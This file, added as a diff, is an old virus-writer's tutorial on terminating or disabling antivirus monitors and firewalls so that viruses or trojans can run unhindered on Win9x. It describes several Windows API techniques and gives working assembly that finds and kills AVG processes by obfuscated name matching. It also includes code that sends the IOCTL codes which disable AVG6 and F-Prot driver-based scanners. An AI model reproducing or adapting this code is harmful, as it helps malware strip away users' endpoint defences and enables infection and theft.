@@ -1,0 +1,304 @@
+Some more ideas on disabling av monitors
+written by juan tamad 
+what we wanna do here is to terminate a running process. this processs can be an av monitor, firewall, or any program that can interfere with the virus or trojan. almost all av monitors can be disabled/closed by another program. there is just no one method that works with all. btw, these methods have only been tested on win9x. 
+
+1. using FindWindow api 
+
+this has been used many times in viruses. if we know the window name (caption) of the monitors main window, we can get its window handle using FindWindow then use that handle to send a WM_QUIT message via PostMessage. by posting a WM_QUIT message to the main window, it tells the program to quit (GetMessage returns 0). if WM_CLOSE is used instead, the message goes though the windows procedure which the app can process like display a confirmation to quit. 
+
+this method does not work when the process does not have a message queue. or when window name is null with a commonly used class like "#32770" (dialog). also it does not work for monitors that use device drivers which act independently. 
+
+2. using EndTask api 
+
+this is a user32 api. this is the method used when ctl-alt-del / End Task is used to terminate a process. 
+
+my copy of win32 api reference does not have an entry for this api (sux). so i just debugged using softice to get some ideas on its params. here is how its called: 
+
+                push 4               ; quit type (0..?)
+                push offset wndname  ; window caption (can be null)
+                push pid             ; process id
+                push hwnd            ; window handle (can be null)
+                call EndTask
+
+for quit type values seems to be: 
+
+        0 = prompts for end task,cancel
+        1 = prompts for wait,end task,cancel
+        2 = posts WM_CLOSE (if no hwnd, same as 0)
+        3 = posts WM_CLOSE (if no hwnd, same as 1)
+        4 = terminates immediately
+        ....
+
+3. using TerminateProcess api 
+
+this method is used mostly by process viewers when they try to kill a process. the only thing we need is a handle (not id) to the target process. the win32 api reference warns us to "Use it only in extreme circumstances". uhhh, ok. 
+
+4. using DebugActiveProcess api 
+
+the main idea here is when the debugger quits, the debuggee will terminate. a program becomes a debugger when it uses windows debug apis. there are two ways to do this. one is to run the process using CreateProcess with a flag of DEBUG_PROCESS. or the other which we are interested in, is to attach to an already running process by calling DebugActiveProcess. remember that once u attach as a debugger, you cannot detach. and once you quit, the target process you are attached to will also quit. just what we want.. 
+
+5. using SetThreadContext api 
+
+this is an extension of the above method. here we are already attached as a debugger and we wanna do somethin else. what we want to do here is to make the target process call ExitProcess. it is always better for a process to terminate itself. to do this, we need to set the eip of thread to point to ExitProcess, then let the program resume (to its death.. hehe). 
+
+6. disabling vxd base monitors 
+
+there are two components of this type of monitors, the ring0 and ring3 module. the ring0 (vxd) handles the job of hooking interrupts & services and does the actual scanning for viruses. while the ring3 (exe) is responsible for giving the user the option to change settings or to disable (and maybe unload) the monitor. 
+
+so the idea is... if an exe can disable the vxd, maybe we can too. so how can the exe communicate with the vxd? by using DeviceIoControl api. by knowing the values passed to the vxd when the monitor is disabled, the virus can duplicate the call using the same parameters. 
+
+btw, since dwIoControlCode is user defined, av programmers can change the values on next version.. (maybe they will forget.. u know em avers) 
+
+7. done 
+
+well thats bout it... one thing to remember is that an id is different from a handle. ie, a pid is not the same as hprocess. and if an api wants a handle, passing an id wont work (this was my initial mistake). 
+
+8. source 
+
+if the above stuff isnt all clear, maybe a sample source may show what i was trying to do. 
+
+;---------------------------------------------------------------------------
+; terminates Notepad using EndTask api
+;
+
+.386
+.model flat,stdcall
+
+extrn GetModuleHandleA:proc
+extrn GetProcAddress:proc
+extrn FindWindowA:proc
+extrn GetWindowThreadProcessId:proc
+extrn ExitProcess:proc
+
+.data
+
+user32          db 'user32.dll',0
+endtask         db 'EndTask',0
+wndname         db 'Untitled - Notepad',0
+pid             dd 0
+
+.code
+start:
+        call FindWindowA,0,offset wndname
+        call GetWindowThreadProcessId,eax,offset pid
+        call GetModuleHandleA,offset user32
+        call GetProcAddress,eax,offset endtask
+        call eax,\      ;USER32!EndTask
+             0,\        ;hWnd
+             pid,\      ;PID
+             0,\        ;lpWndName
+             4          ;nType
+        call ExitProcess,0
+end start
+
+;---------------------------------------------------------------------------
+;terminates avg control center using TerminateProcess
+;
+
+.386
+.model flat,stdcall
+
+extrn ExitProcess :proc
+extrn CloseHandle :proc
+extrn CreateToolhelp32Snapshot :proc
+extrn Process32First :proc
+extrn Process32Next :proc
+extrn lstrlenA :proc
+extrn OpenProcess :proc
+extrn TerminateProcess :proc
+
+PROCESS_TERMINATE       equ 1
+TH32CS_SNAPPROCESS      equ 2
+
+PROCESSENTRY32 STRUCT
+    dwSize              dd ?
+    cntUsage            dd ?
+    th32ProcessID       dd ?
+    th32DefaultHeapID   dd ?
+    th32ModuleID        dd ?
+    cntThreads          dd ?
+    th32ParentProcessID dd ?
+    pcPriClassBase      dd ?
+    dwFlags             dd ?
+    szExeFile           db 260 dup(?)
+PROCESSENTRY32 ENDS
+
+.data
+
+processentry            PROCESSENTRY32 
+
+.code
+start:
+        call CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
+        mov ebx,eax
+        call Process32First,eax,offset processentry
+        .while eax!=0
+                lea edi,[processentry.szExeFile]
+                call lstrlenA,edi
+                mov ecx,eax
+                .repeat
+                        mov eax,[edi]
+                        xor eax,[edi+4]
+                        .if eax=='CGVA' XOR '.23C'      ;'AVGCC32.EXE'
+                                .break
+                        .elseif eax=='SGVA' XOR '9VRE'  ;'AVGSERV9.EXE'
+                                .break
+                        .endif
+                        inc edi
+                        dec ecx
+                .until ecx==0
+                .if ecx!=0
+                        call OpenProcess,PROCESS_TERMINATE,0,[processentry.th32ProcessID]
+                        call TerminateProcess,eax,0
+                .endif
+                call Process32Next,ebx,offset processentry
+        .endw
+        call CloseHandle,ebx
+        call ExitProcess,0
+end start
+
+;---------------------------------------------------------------------------
+;terminates avg control center using DebugActiveProcess
+;
+
+.386
+.model flat,stdcall
+
+extrn ExitProcess :proc
+extrn CloseHandle :proc
+extrn CreateToolhelp32Snapshot :proc
+extrn Process32First :proc
+extrn Process32Next :proc
+extrn lstrlenA :proc
+extrn DebugActiveProcess :proc
+extrn WaitForDebugEvent :proc
+extrn ContinueDebugEvent :proc
+extrn GetThreadContext :proc
+extrn SetThreadContext :proc
+extrn GetProcAddress :proc
+extrn GetModuleHandleA :proc
+
+PROCESS_TERMINATE       equ 1
+TH32CS_SNAPPROCESS      equ 2
+DBG_CONTINUE            equ 00010002h
+CREATE_PROCESS_DEBUG_EVENT equ 3
+EXIT_PROCESS_DEBUG_EVENT equ 5
+
+PROCESSENTRY32 STRUCT
+    dwSize              dd ?
+    cntUsage            dd ?
+    th32ProcessID       dd ?
+    th32DefaultHeapID   dd ?
+    th32ModuleID        dd ?
+    cntThreads          dd ?
+    th32ParentProcessID dd ?
+    pcPriClassBase      dd ?
+    _dwFlags            dd ?
+    szExeFile           db 260 dup(?)
+PROCESSENTRY32 ENDS
+
+.data
+
+processentry    PROCESSENTRY32 
+de              db 0ffh dup (0)
+context         dd 10017h       ;CONTEXT
+                db 0ffh dup (0)
+regEip          equ 0B8h
+k32             db "kernel32.dll",0
+exitproc        db "ExitProcess",0
+
+.code
+start:
+        call CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
+        mov ebx,eax
+        call Process32First,eax,offset processentry
+        .while eax!=0
+                lea edi,[processentry.szExeFile]
+                call lstrlenA,edi
+                mov ecx,eax
+                .repeat
+                        mov eax,[edi]
+                        xor eax,[edi+4]
+                        .if eax=='CGVA' XOR '.23C'      ;'AVGCC32.EXE'
+                                .break
+                        .elseif eax=='SGVA' XOR '9VRE'  ;'AVGSERV9.EXE'
+                                .break
+                        .elseif eax=='ETON' XOR '.DAP'  ;'NOTEPAD.EXE'
+                                .break
+                        .elseif eax=='CLAC' XOR 'EXE.'  ;'CALC.EXE'
+                                .break
+                        .endif
+                        inc edi
+                        dec ecx
+                .until ecx==0
+                .if ecx!=0
+                        call DebugActiveProcess,[processentry.th32ProcessID]
+
+; this is #5      ;  @:  call WaitForDebugEvent,offset de,-1
+                  ;      .if dword ptr [de]==CREATE_PROCESS_DEBUG_EVENT
+                  ;              call GetModuleHandleA,offset k32
+                  ;              call GetProcAddress,eax,offset exitproc
+                  ;              mov ebx,eax
+                  ;              call GetThreadContext,dword ptr[de+14h],offset context
+                  ;              mov dword ptr[context+regEip],ebx
+                  ;              call SetThreadContext,dword ptr[de+14h],offset context
+                  ;      .elseif dword ptr[de]==EXIT_PROCESS_DEBUG_EVENT
+                  ;              .break
+                  ;      .endif
+                  ;      call ContinueDebugEvent,dword ptr[de+4],dword ptr[de+8],DBG_CONTINUE
+                  ;      jmp @
+
+                .endif
+                call Process32Next,ebx,offset processentry
+        .endw
+        call CloseHandle,ebx
+        call ExitProcess,0
+end start
+
+
+
+;---------------------------------------------------------------------------
+; disable av vxds (for avg6 and fprot 3.11)
+;
+
+.386
+.model flat,stdcall
+
+extrn ExitProcess:proc
+extrn CreateFileA:proc
+extrn CloseHandle:proc
+extrn DeviceIoControl:proc
+
+.data
+
+FILE_ATTRIBUTE_NORMAL equ 80h
+OPEN_EXISTING   equ 3
+GENERIC_READ    equ 80000000h
+
+fp_enable       equ 9f69100fh
+fp_disable      equ 9f691013h
+avg_iocode      equ 5349a008h
+avg_disable     dd 862h
+avg_enable      dd 062h
+temp            dd 0
+fp_vxd          db '\\.\FSTOPW',0
+avg_vxd         db '\\.\AVGFSH',0
+
+.code
+start:
+        call CreateFileA,offset fp_vxd,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
+        .if eax!=1
+                mov ebx, eax
+                call DeviceIoControl,eax,fp_disable,0,0,0,0,offset temp,0
+                call CloseHandle,ebx
+        .endif
+        call CreateFileA,offset avg_vxd,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
+        .if eax!=1
+                mov ebx, eax
+                call DeviceIoControl,eax,avg_iocode,offset avg_disable,4,0,0,offset temp,0
+                call CloseHandle,ebx
+        .endif
+        call ExitProcess
+end start
+
+
